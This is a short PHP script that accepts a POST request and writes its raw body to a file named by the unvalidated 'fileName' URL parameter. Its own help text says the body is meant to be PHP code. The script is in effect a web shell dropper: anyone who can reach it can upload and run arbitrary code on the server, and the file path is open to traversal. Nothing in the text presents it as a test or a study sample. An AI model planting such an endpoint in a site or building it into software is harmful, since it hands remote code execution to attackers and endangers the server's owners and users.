<?php
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $fileName = $_GET["fileName"];

    $body = file_get_contents('php://input');
    $myFile = fopen($fileName, "w");
    fwrite($myFile, $body);

    http_response_code(200);
    echo("created " . $fileName);
  }
  else {
    http_response_code(503);
    echo('Use a post request with the "fileName" as a url parameter and the php code as the post body.');
  }
?>